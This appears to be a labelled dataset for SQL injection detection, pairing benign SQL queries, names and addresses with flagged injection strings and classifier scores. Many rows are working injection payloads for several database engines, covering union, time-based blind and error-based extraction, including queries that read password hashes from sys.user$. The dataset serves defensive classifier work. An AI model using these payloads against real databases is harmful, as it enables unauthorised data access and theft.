select min ( price )  as smallestpricefrom products;,0,0,0.030125546758155358
294r1152ar,0,0,0.004468253314358248
select * from nervous where sign = 'shade',0,0,0.0
16630,0,0,0.004468253314358248
"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",1,1,1.0
"1"" where 3247  =  3247 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
castillejo de meslen,0,0,0.0
"-5478""  )   where 4100  =  4100 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,1.0
condal talero,0,0,0.004468253314358248
select * from grew fetch first 50 percent rows onlyselect top 3 * from weigh,0,0,0.0
3151,0,0,0.004468253314358248
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",1,1,1.0
-5369'  )   or 3208  =  6669#,1,1,1.0
select count ( distinct salt )  from equator,0,0,0.0
"1'+  (  select 'aphz' where 1933  =  1933 union all select null,null,null,null,null,null#",1,1,1.0
"-1678"" where 3706  =  3706 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,1.0
2.79567e+15,0,0,0.0
"c/ bascuana 52, 5-e",0,0,0.0
91394289v,0,0,0.004468253314358248
select avg ( broad ) from trouble,0,0,0.0
arguisuelas,0,0,0.004468253314358248
"1"" where 9919  =  9919",1,1,1.0
6.67245e+15,0,0,0.0
"1'  )   where 3375  =  3375 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
8.69184e+15,0,0,0.0
3.89386e+15,0,0,0.0
1 where 4003  =  4003 union all select null--,1,1,0.99
select * from  ( select view from shallow ) ,0,0,0.0
"-8178  )   union all select 4163,4163,4163,4163,4163,4163,4163--",1,1,1.0
1157,0,0,0.004468253314358248
select avg ( unhappy ) from require select sum ( trip ) ,0,0,0.0
torralba del ro,0,0,0.0
murillo el cuende,0,0,0.0
56702228y,0,0,0.004468253314358248
15553,0,0,0.004468253314358248
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,1.0
24443,0,0,0.004468253314358248
"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",1,1,1.0
57317186j,0,0,0.004468253314358248
select avg ( package ) from queen select sum ( ran ) ,0,0,0.0
"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1,1,1.0
daya basulto,0,0,0.004468253314358248
select min ( rule )  as with from event,0,0,0.0
brenda,0,0,0.004468253314358248
" select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",1,1,1.0
cruz iparraguirre,0,0,0.004468253314358248
"1%""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""%""  =  """,1,1,1.0
delete from also where noon = 'height',0,0,0.0
sedero,0,0,0.004468253314358248
"1%'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
select * from research where pupil like '%work%',0,0,0.0
" select * from broad order by took asc, happened desc",0,0,0.0
select * from said where slowly = 'lose',0,0,0.0
valdemaluque,0,0,0.004468253314358248
"1""  )   where 3084  =  3084 union all select null,null--",1,1,1.0
select * from nervous where burn  between 10 and 20,0,0,0.0
from  ( select distinct dull from basic ) ,0,0,0.0
"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,1,1,1.0
bacio bonnin,0,0,0.004468253314358248
-2411%'   )    )     )   or 6872  =  6872 and    (    (     (  '%'  =  ',1,1,1.0
"1""  )   as dfmm where 7563  =  7563 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
select avg ( motor ) from explore,0,0,0.0
select avg ( increase )  from president  select sum ( today ) ,0,0,0.0
79144797a,0,0,0.004468253314358248
1'   )    )    as myws where 5274  =  5274,1,1,1.0
select * from anywhere where am = 'everything'  or bigger = 'dropped',0,0,0.0
" select * from users where id  =  1 union select 1 $,version  (    )   -- 1",1,1,1.0
"1%"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,1,1,1.0
-8233' or 9538  =  1882#,1,1,1.0
from  ( select distinct twice from larger ) ,0,0,0.0
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,1,1.0
select * from after where price not between 10 and 20,0,0,0.0
"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
educativa,0,0,0.004468253314358248
"1""   )    )    as vigs where 6175  =  6175 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1,1.0
select count ( him ) from doing,0,0,0.0
lora@rocofer.jobs,0,0,0.004468253314358248
"-7714 where 9768  =  9768 union all select 9768,9768--",1,1,1.0
kavid,0,0,0.004468253314358248
"1   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   5776  =  5776",1,1,1.0
2672,0,0,0.004468253314358248
"1""  )   where 5005  =  5005 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,1,1.0
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,1,1,1.0
select * from users where id  =  1 +1 or 1  =  1 -- 1,1,1,1.0
chilel,0,0,0.004468253314358248
select * from your where river = 'cast'  or beyond = 'solid',0,0,0.0
"  select then,steel from shoe where opinion = 'once' union select physical, changing from gulf",0,0,0.01
select * from dried  where worse = or,0,0,0.08
"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",1,1,1.0
calle tras do colexio s/n,0,0,0.0
"1%""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""%""  =  """,1,1,1.0
escal,0,0,0.004468253314358248
select mood from power,0,0,0.0
select * from column where captain not between 'dear' and 'variety',0,0,0.0
"1%' union all select null,null#",1,1,0.99
1n154c3602,0,0,0.004468253314358248
select * from nearby where closely between several09/01/1996kind and muscle15/31/1996relationship,0,0,0.0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c886067718' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0,0,0.0
 and 1  =  utl_inaddr.get_host_address   (    (   select global_name from global_name   )    )    and 'i'  =  'i,1,1,0.99
ns,1,0,0.004468253314358248
" end and    (    (   ""%""  =  """,1,1,1.0
select * from cutting where flat  between 10 and 20,0,0,0.0
"  update won set known =  'prepare', city =  'far' where dust =  terrible",0,0,0.0
select thus ( s )  from earth left join,0,0,0.0
acu7ntiar,0,0,0.004468253314358248
select count ( featureid ) from jar,0,0,0.0
select * from per where customs = 'setting' fetch first 3 rows only,0,0,0.0
or 1  =  1 /*,1,1,0.99
select * from huge 3 select * from mine,0,0,0.0
1'   )    )    as egsj where 3447  =  3447,1,1,1.0
select top 3 * from human where could = 'pretty',0,0,0.0
select count ( wait ) from army,0,0,0.0
"1' where 8430  =  8430 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
rad0oelctrico,0,0,0.004468253314358248
select avg ( hay ) from late select sum ( smell ) ,0,0,0.0
select avg ( step ) from say select sum ( wife ) ,0,0,0.0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5f6c883f67716' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0,0,0.0
"insert into help ( grandfather, lungs, trail, time, closer, tongue )  values  ( 'mistake', 'means'. surprise', 'outer', 'porch', 'beside', 'captain' )  ",0,0,0.0
"1""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select * from drop where    not offer = 'conversation',0,0,0.0
embo4ina80,0,0,0.004468253314358248
crovetto roger,0,0,0.004468253314358248
"  select * from step where knew in  ( 'suit', 'shine', 'pot' )  ",0,0,0.0
"   select supper, finger, entirefrom slope where here  is not null",0,0,0.0
45591,0,0,0.004468253314358248
select min ( interest )  as flat from planet,0,0,0.0
select count ( everything )  from typical,0,0,0.0
"insert into solve ( fear, curious, still, perhaps, about, doctor )  values  ( 'broad', 'own'. walk', 'hurry', 'children', 'love', 'drop' )  ",0,0,0.0
focas@programaciones.com.sz,0,0,0.0
select * from gate fetch first 50 percent rows onlyselect top 3 * from six,0,0,0.0
select * from glass where slightly not like '[cause]%',0,0,0.0
"1' where 8869  =  8869 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
51842682s,0,0,0.004468253314358248
agn,0,0,0.004468253314358248
navalvillar de ibor,0,0,0.0
1' in boolean mode  )   and 9198  =  9198--,1,1,0.98
select * from sum  where lose = problem,0,0,0.02
"-5165'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'zpnv' like 'zpnv",1,1,1.0
select * from flower where mail in  ( select source from these ) ,0,0,0.0
1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,1.0
"-3775'  )   as rqet where 7092  =  7092 or elt  (  1032  =  1032,3623  )  --",1,1,1.0
1' where 8159  =  8159 union all select null#,1,1,0.98
select private ( s )  from nor union,0,0,0.0
select * from else fetch first 50 percent rows only,0,0,0.01
"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""otgh"" like ""otgh",1,1,1.0
"1""   )    )    as wooq where 7671  =  7671 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1,1,1.0
"1"" where 7005  =  7005",1,1,1.0
select * from arrange order by southern desc,0,0,0.0
"insert into stranger ( outside, choice, too, sea, root, smile )  values  ( 'likely', 'third'. deep', 'adult', 'straw', 'energy', 'dog' )  ",0,0,0.0
"   select count ( heard ) , floating from harder by difficult",0,0,0.0
"-8773%'   )    )     )   union all select 8941,8941,8941,8941,8941,8941#",1,1,1.0
"-4044%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1,1,1.0
vazkn,0,0,0.004468253314358248
select * from products,0,0,0.0
select * from slope,0,0,0.0
farese@bloodline.as,0,0,0.2616130351360655
select top 50 percent * from remember,0,0,0.0
"1""  )   as kuuf where 6908  =  6908",1,1,1.0
"1  )   as xuvz where 3061  =  3061 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"1%'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",1,1,1.0
"1'+  (  select 'fxhh' where 2571  =  2571 union all select null,null,null,null,null,null,null--",1,1,1.0
"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",1,1,1.0
select mental from double union all select were from sold order by rice,0,0,0.0
select * from atom 3 select * from immediately,0,0,0.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   3127  =  3127",1,1,1.0
select * from struggle  where tea = forest,0,0,0.0
"  select women,mass,conversation from blind left join orders on reason.lunchid =  instant.corn order by out.thus",0,0,0.0
select top 3 * from power where answer = 'be' select * from tube,0,0,0.0
"1%' or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select top 50 percent * from definition select * from practice fetch first 50 percent rows onlyselect top 3 * from cook,0,0,0.0
newlinsky@forohh.et,0,0,0.004468253314358248
"   select monkey, operation+ ', ' + finger+ ' ' + tool+ ', ' + speed as built  from development",0,0,0.02
8912,0,0,0.004468253314358248
"1%'   )    )    union all select null,null,null,null--",1,1,1.0
-7561  )   as ilrm where 8828  =  8828 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,1,1.0
60210107v,0,0,0.004468253314358248
or 2 between 1 and 3,1,1,0.92
select * from play order by taught desc,0,0,0.0
"1'||  (  select 'pvmz' from dual where 1090  =  1090 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",1,1,1.0
from  ( select distinct since from went ) ,0,0,0.0
"1%""  )   and 4595  =  4595#",1,1,1.0
"1%""  )   union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  8   )    )    and 'i'  =  'i",1,1,1.0
select * from disappear where ago between 'square' and 'powerful',0,0,0.0
marmolejos,0,0,0.004468253314358248
delete from deal where behavior = 'white',0,0,0.0
select avg ( while ) from early,0,0,0.0
sorbello8@carrillo-de-albornoz.jobs,0,0,0.02
"1"" and   (  3020  =  3020  )  *6703 and ""tnzp"" like ""tnzp",1,1,1.0
select avg ( gradually ) from load select sum ( average ) ,0,0,0.0
"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
select * from made where group = 'crop' fetch first 3 rows only,0,0,0.0
ansorger,0,0,0.004468253314358248
select * from doll where    not shaking = 'soon',0,0,0.0
select top 3 * from engineer where attached = 'circus' select * from contain,0,0,0.0
select * from clothing where shaking between which09/01/1996plate and meant15/31/1996lie,0,0,0.0
select top 50 percent * from report select * from yesterday fetch first 50 percent rows onlyselect top 3 * from spirit,0,0,0.0
94lp90ulo,0,0,0.004468253314358248
"-9959""  )   where 7073  =  7073 union all select 7073,7073,7073,7073,7073,7073,7073,7073#",1,1,1.0
"1%""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,1,1,1.0
"select productname, unitprice *  ( unitsinstock + unitsonorder )  from products;",0,0,0.01
31640,0,0,0.004468253314358248
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'rozr' like 'rozr,1,1,1.0
select * from carried where price not between 10 and 20,0,0,0.0
select quick ( s )  from distant,0,0,0.0
navia de suarna,0,0,0.0
yalile,0,0,0.004468253314358248
select student ( s )  from ball union,0,0,0.0
membrilla,0,0,0.004468253314358248
" select * from double order by steam asc, breeze desc",0,0,0.0
hiplita,0,0,0.004468253314358248
"-3215""  )   union all select 4457,4457,4457,4457,4457#",1,1,1.0
select * from onto where equally = 'square'  and  ( guess = 'snake' or break = 'bare' ) ,0,0,0.01
"-2725"" union all select 3671,3671,3671,3671,3671#",1,1,1.0
 or 1 --',1,1,0.97
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""qqfd"" like ""qqfd",1,1,1.0
 or '1'  =  '1,1,1,0.99
"1'   )    )     )   union all select null,null,null,null,null,null--",1,1,1.0
killan@923.fr,0,0,0.004468253314358248
valdearcos de la vega,0,0,0.0
1 where 9932  =  9932,1,1,1.0
catalda,0,0,0.004468253314358248
"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'tzbp'  =  'tzbp",1,1,1.0
"1""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""staz"" like ""staz",1,1,1.0
select option_value from wp_options where option_name  =  'options_footer_button_1_link' limit 1,0,0,0.0
"  select orders.againrid, employees.might, employees.religious from ordersright join employees on orders.employeeid  =  employees.fightid order by orders.structureid",0,0,0.0
50610,0,0,0.004468253314358248
"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select top 3 * from ago select * from found 3select * from mostly,0,0,0.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""  =  """,1,1,0.99
"1' where 2373  =  2373 union all select null,null#",1,1,0.99
"  select advice as plenty, watch as [plan]  from race",0,0,0.0
"1'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
"1' in boolean mode  )   union all select null,null--",1,1,1.0
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1,1.0
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy",1,1,1.0
 or 3  =  3 --,1,1,1.0
select * from customers where  ( customername like 'l%' or customername like 'r%' /*or customername like 's%' or customername like 't%'*/ or customername like 'w%' )  and country = 'usa' order by customername;,0,0,0.5
barcones,0,0,0.004468253314358248
from  ( select distinct solar from cotton ) ,0,0,0.0
select top 50 percent * from scene,0,0,0.0
select   (  case when   (  6276  =  6276  )   then 6276 else 6276*  (  select 6276 from information_schema.character_sets  )   end  )  #,1,1,1.0
aborr-ascarse,0,0,0.006527024015406931
ibarrangelu,0,0,0.004468253314358248
5.12832e+15,0,0,0.0
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'ecur'  =  'ecur,1,1,1.0
"  select orders.showrid, employees.flew, employees.something from ordersright join employees on orders.employeeid  =  employees.officeid order by orders.thoseid",0,0,0.0
select * from practice where waste = 'board'  and city = 'control',0,0,0.0
select * from child,0,0,0.0
"1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   ",1,1,1.0
" select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1,1,0.99
select top 3 * from tax where aboard = 'gulf' select * from skin,0,0,0.0
delete from steam where feel = 'tide',0,0,0.0
"select * from operation where stick between ""generally"" and    ""promised""",0,0,0.0
select * from range where syllable = 'sides',0,0,0.0
select * from dream where value between 'news' and 'mud',0,0,0.0
corcoll duhalde,0,0,0.004468253314358248
select * from zebra where gulf between 'represent' and 'additional',0,0,0.0
-8112'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'xopg'  =  'xopg,1,1,1.0
1%'   )    )    and 2006  =  2006,1,1,0.9900451374640952
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'fjfo'  =  'fjfo",1,1,1.0
"   select count ( meal ) , wonder from primitive by tall",0,0,0.0
select supply,0,0,0.00024957571886764606
1  )   rlike sleep  (  5  )  #,1,1,1.0
or isnull  (  1/0  )   /*,1,1,0.88
select * from are fetch first 3 rows only,0,0,0.0
delete from union where drew = 'gravity',0,0,0.03
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'ndhn' like 'ndhn",1,1,1.0
select * from language where yourself = 'goose'  or smoke = 'being',0,0,0.0
roze,0,0,0.004468253314358248
25g0a00,0,0,0.004468253314358248
"-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#",1,1,1.0
select top 3 * from hung where pan = 'practical' select * from fed,0,0,0.0
1%'  )   and 2006  =  2006,1,1,0.9900451374640952
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",1,1,1.0
gracindo@ajuntamentbcn2-0.jp,0,0,0.05166666666666666
select drive from wheel union select slip from neck order by wave,0,0,0.0
philip7,0,0,0.004468253314358248
santa cruz de tenerife,0,0,0.0
select avg ( successful ) from ride,0,0,0.0
select min ( not )  as compound from bar,0,0,0.0
"select wp_posts.id from wp_posts left join wp_term_relationships on  ( wp_posts.id  =  wp_term_relationships.object_id )  where 1 = 1 and  (  wp_term_relationships.term_taxonomy_id in  ( 2636 )   )  and wp_posts.post_type  =  'support_family' and   (  (  wp_posts.post_status  =  'publish'  )  )   group by wp_posts.id order by wp_posts.post_title asc limit 0, 10",0,0,0.09
5537,0,0,0.004468253314358248
select * from slowly order by wooden,0,0,0.0
fuente el olmo de scar,0,0,0.0
calle bendicion 160,0,0,0.0
select your from natural,0,0,0.0
chua@comerciosdeaspe.om,0,0,0.004468253314358248
34081266g,0,0,0.004468253314358248
select avg ( say ) from shirt select sum ( desert ) ,0,0,0.0
alh4a3,0,0,0.004468253314358248
select option_value from wp_options where option_name  =  '_options_number_of_support_family' limit 1,0,0,0.0
"1""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
28782647x,0,0,0.004468253314358248
goertzen,0,0,0.004468253314358248
select avg ( indicate )  from quietly  select sum ( smooth ) ,0,0,0.0
select * from shelf where sometime  between 10 and 20,0,0,0.0
"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",1,1,1.0
"1  )   where 2781  =  2781 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select * from fewer order by suddenly,0,0,0.0
0x770061006900740066006f0072002000640065006c00 ...,1,0,0.004468253314358248
"av. don juan de borbon, s/n",0,0,0.0
matungo,0,0,0.004468253314358248
select * from seed fetch first 50 percent rows onlyselect top 3 * from particular,0,0,0.0
c4l6716o,0,0,0.004468253314358248
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",1,1,1.0
bowman pinela,0,0,0.004468253314358248
select option_value from wp_options where option_name  =  'options_footer_logo' limit 1,0,0,0.0
"select * from search where tea between ""struggle"" and    ""fire""",0,0,0.0
select * from species fetch first 50 percent rows only,0,0,0.0
1   )    )    as fqee where 3286  =  3286,1,1,1.0
select * from quarter where although = 'grow',0,0,0.0
"-9209%""   )    )     )   union all select 3736,3736,3736--",1,1,1.0
calle juan agui 97 9-e,0,0,0.0
plumero,0,0,0.004468253314358248
lev@ozlon.ke,0,0,0.004468253314358248
select slabs ( s from alike right join,0,0,0.0
8.64151e+15,0,0,0.0
1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'ineq' like 'ineq,1,1,1.0
waitfor delay '0:0:5' and 'gsvt'  =  'gsvt,1,1,1.0
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'ekqv'  =  'ekqv",1,1,1.0
select making ( s )  from supply left join,0,0,0.0
8.83352e+15,0,0,0.0
guinee@misanimalesdomesticos.jp,0,0,0.004468253314358248
select * from minute where story = 'student'  and city = 'bill',0,0,0.0
select look ( s from mostly right join,0,0,0.0
"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",1,1,1.0
oviedo,0,0,0.004468253314358248
5.26636e+15,0,0,0.0
3349,0,0,0.004468253314358248
1%'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,1.0
"1"" or sleep  (  5  )   and ""fbuo"" like ""fbuo",1,1,1.0
select * from cost where century between kept09/01/1996meal and smile15/31/1996forward,0,0,0.0
select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,1.0
paracuellos de jarama,0,0,0.0
"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
1' where 5819  =  5819 and   (  1275  =  4759  )  *4759--,1,1,1.0
select * from any  where brother not like '[roll]%',0,0,0.0
tomi,0,0,0.004468253314358248
select shallow ( s )  from label left join,0,0,0.0
"   select employees.broken, count ( orders.populationid )  as actfrom    ( ordersinner join mood on orders.locateid  =  employees.dutyid ) ",0,0,0.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  2   )    )    and 'i'  =  'i",1,1,1.0
42808198t,0,0,0.004468253314358248
1   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,1.0
" select * from coal order by closer, essential",0,0,0.0
"1"" where 2204  =  2204 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
select count ( escape ) from offer,0,0,0.0
select count ( author ) from bear,0,0,0.0
1'  )   as hcpp where 1863  =  1863,1,1,1.0
"1  )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
manquel,0,0,0.004468253314358248
"  select extract ( month from ""2017-06-15"" ) ;",0,0,0.0
clunes7@palodegolf.com.coop,0,0,0.0
pembrooke_coates@stainless.gd,0,0,0.004468253314358248
